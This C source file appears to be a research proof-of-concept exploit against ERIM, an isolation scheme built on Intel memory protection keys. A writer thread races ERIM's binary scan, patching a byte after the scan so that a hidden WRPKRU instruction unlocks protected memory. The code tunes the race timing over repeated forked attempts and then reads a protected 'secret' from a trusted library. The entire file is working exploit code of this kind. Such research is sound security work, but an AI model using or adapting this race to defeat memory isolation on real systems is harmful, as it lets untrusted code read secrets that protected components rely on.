#define _GNU_SOURCE 
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <erim.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/syscall.h> 
#include <errno.h> 

#include "secure_lib.h"

static struct timespec thread_start, thread_finish, scan_start, scan_finish;

static pthread_mutex_t lock; 

static unsigned char unlock[] = {
	0x50, 0x52, 0x51, // push rax, rdx, rcx
	0x31, 0xc9,  // xor ecx, ecx
	0x31, 0xd2,  // xor edx, edx
	0xb8, 0x50, 0x55, 0x55, 0x55, // mov eax,0x55555550
	0x0f, 0x01, 0xef, // wrpku
	0x59, 0x5a, 0x58, // pop rcx, rdx, rax
	0xc3, // ret
	0
};

static unsigned char benign_wrpkru[] = {
	0x31, 0xc9,  // xor ecx, ecx
	0x31, 0xd2,  // xor edx, edx
	0xb8, 0x5c, 0x55, 0x55, 0x55, // mov eax,0x5555555c
	0x0f, 0x01, 0xef, // wrpku
	0x3d, 0x5c, 0x55, 0x55, 0x55, // cmp eax,0x5555555c
    0x75, 0xed // jnz -18
};


static struct timespec wait_time, end_time;

static size_t const scan_size = 2e9;


void set_core(int core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);

    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset)) {
        perror("could not set affinity");
        exit(1);
    }
}

typedef struct thread_args {
    void *page;
    long wait_ns;
} thread_args;

void *write_instruction(void *varg)
{
    thread_args *args = (thread_args*)varg;
    char *buf = args->page;

    set_core(1);

	clock_gettime(CLOCK_MONOTONIC, &thread_start); 

	pthread_mutex_lock(&lock); 

	wait_time.tv_sec  = 0;
	wait_time.tv_nsec = args->wait_ns;
	nanosleep(&wait_time, &end_time);

    buf[12] = 0x0f;

	pthread_mutex_unlock(&lock); 

	clock_gettime(CLOCK_MONOTONIC, &thread_finish);	
	return NULL;
}

pid_t gettid() {
    return syscall(SYS_gettid);
}

#define RESULT_EARLY 1
#define RESULT_LATE 2
#define RESULT_SUCCESS 3

int wait_for_child_exit(pid_t child, int pipe) {
    int status;
    int i, r;
    char *early_string = "found non benign WRPKRU";
    char *late_string = "not related to pending exec";
    char *success_string = "TRYING TO STEAL THE SECRET";

    size_t buf_size = 1024;
    size_t buf_full = 0;
    char *buf = malloc(buf_size);

    int result = 0;

    while (!result) {
        if (buf_full >= buf_size) {
            if ((buf_size << 1) <= buf_size) {
                fprintf(stderr, "cannot expand buffer\n"); 
                exit(1);
            }
            buf = realloc(buf, buf_size<<1);
            if (!buf) { 
                fprintf(stderr, "out of memory\n"); 
                exit(1);
            }

            buf_size = buf_size << 1;
        }

        //printf("reading from pipe buf size: %lld filled: %lld\n", buf_size, buf_full);
        r = read(pipe, buf+buf_full, buf_size - buf_full);


        if (r > 0) {
            printf("------- BEGIN READ DATA -------\n");
            for (i=0; i < r; i++) {
                printf("%c", (buf[buf_full + i]));
            }
            printf("-------- END READ DATA --------\n");

            buf_full += r;
        }
        else {
            perror("read");
            exit(1);
        }


        if (memmem(buf, buf_full, early_string, strlen(early_string))) {
            result = RESULT_EARLY;
        }
        else if (memmem(buf, buf_full, late_string, strlen(late_string))) {
            result = RESULT_LATE;
        }
        else if (memmem(buf, buf_full, success_string, strlen(success_string))) {
            result = RESULT_SUCCESS;
        }
    }

    while (1) {
        waitpid(child, &status, 0);
        if (WIFEXITED(status)) {
            break;
        }
        else if (WIFSIGNALED(status)) {
            break;
        }
    }

    return result;
}


int try_race(long wait_ns) {
	if (pthread_mutex_init(&lock, NULL) != 0) 
	{ 
		fprintf(stderr, "mutex init has failed\n"); 
		return -1;
	} 

	// map in r/w mem
	void *scan_region = mmap((void*)0x100000000, scan_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	printf("mapped memory\n");

	memset(scan_region, 0, scan_size);

    char *p = scan_region;
    char *end = p + scan_size;

	memcpy(p, unlock, sizeof(unlock));       
    p += sizeof(unlock);

    /*
    while (p + sizeof(benign_wrpkru) < end) {
        memcpy(p, benign_wrpkru, sizeof(benign_wrpkru));
        p += sizeof(benign_wrpkru);
    }
    */

    uint8_t *buf = (uint8_t*)scan_region;
    buf[12] = 0xc3;
    /*
    for (i=0; i < sizeof(unlock); i++) {
        if (buf[i] == 0x0f && buf[i+1] == 0x01 && buf[i+2] == 0xef) {
            buf[i] = 0xc3;
            break;
        }
    }
    */

	// spawn writer
	pthread_t write_thread;
	pthread_mutex_lock(&lock); 

    thread_args args;
    args.page = scan_region;
    args.wait_ns = wait_ns;

	if(pthread_create(&write_thread, NULL, write_instruction, &args)) {
		fprintf(stderr, "thread creation failed\n");
		return -1;
	}

    set_core(0);

	// mark as exec and scan
	printf("MAIN: marking exec...\n");
	mprotect(scan_region, scan_size, PROT_READ|PROT_WRITE|PROT_EXEC); 
	void (*fun_ptr)(void) = scan_region;
	printf("MAIN: scanning...\n"); 

    errno = 0;

    int r = setpriority(PRIO_PROCESS, gettid(), 19);
    if (errno) perror("setpriority");

	clock_gettime(CLOCK_MONOTONIC, &scan_start);
	pthread_mutex_unlock(&lock);
	fun_ptr();
	clock_gettime(CLOCK_MONOTONIC, &scan_finish);

	printf("MAIN: scan start: %lld.%.9ld\n", (long long)scan_start.tv_sec, scan_start.tv_nsec);
	printf("MAIN: scan end: %lld.%.9ld\n", (long long)scan_finish.tv_sec, scan_finish.tv_nsec);

	if(pthread_join(write_thread, NULL)) {
		fprintf(stderr, "also damn\n");
		return -1;
	}

	printf("MAIN: thread start: %lld.%.9ld\n", (long long)thread_start.tv_sec, thread_start.tv_nsec);
	printf("MAIN: thread end: %lld.%.9ld\n", (long long)thread_finish.tv_sec, thread_finish.tv_nsec);

	printf("MAIN: ok, trying to unlock now\n");
	// grab the goodies
	fun_ptr();

	char s[128] = {0};
	snprintf(s, sizeof(s), "%s", secure_lib_secret);

	printf("TRYING TO STEAL THE SECRET: %s\n", s);

	pthread_mutex_destroy(&lock);
	return 0;
}


int main(int argc, char **argv) {
	secure_lib_init();
	printf("accessing secret through trusted library:\n");
	secure_lib_print_secret();

    long wait_ns = 1000L;
    long max_early = 0;
    long min_late = -1;

    int streak = 0;
    int streak_type = 0;

    int rc;
    int got_secret = 0;

    while (!got_secret) {
        int pipefd[2];
        if (pipe2(pipefd, 0) < 0) {
            perror("pipe");
            exit(1);
        }

        pid_t child = fork();

        if (child == 0) {
            if (dup2(pipefd[1], 1) < 0) {
                perror("dup");
                exit(1);
            }
            if (dup2(pipefd[1], 2) < 0) {
                perror("dup");
                exit(1);
            }

            try_race(wait_ns);
            exit(0);
        }
        else if (child > 0) {
            rc = wait_for_child_exit(child, pipefd[0]);

            if (rc == streak_type) streak++;
            else {
                streak_type = rc;
                streak = 0;
            }
            if (streak > 16) streak = 16;

            printf("waited: %ld streak: %d ", wait_ns, streak);
            if (rc == RESULT_SUCCESS) {
                got_secret = 1;
            }
            else if (rc == RESULT_EARLY) {
                printf("result: EARLY\n");
                wait_ns += (2 << streak);
            }
            else if (rc == RESULT_LATE) {
                printf("result: LATE\n");
                wait_ns -= (2 << streak);
            }

        }
        else {
            perror("fork");
            exit(1);
        }

        close(pipefd[0]);
        close(pipefd[1]);
    }

}

